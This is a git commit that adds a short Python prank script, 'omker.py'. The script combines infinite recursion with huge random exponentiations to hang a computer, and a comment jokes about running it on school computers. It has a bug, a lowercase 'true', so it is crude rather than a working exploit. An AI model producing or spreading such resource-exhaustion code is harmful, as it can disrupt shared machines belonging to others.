08e1345f61fe2279544df7101305faa09e1e79c7
penguin-number-123 <mumuji1723@gmail.com>
2022-02-28 14:07:31 +0800

    haha

---
+++ omker.py
@@ -0,0 +1,8 @@
+#haha
+from random import randint
+def x():
+  randint(0,99999999)**randint(0,999999999)
+  x()
+while(true):
+  x()
+#I am not responsible for any damages caused. Please DO NOT run this (Unless you're on a school computer lol).
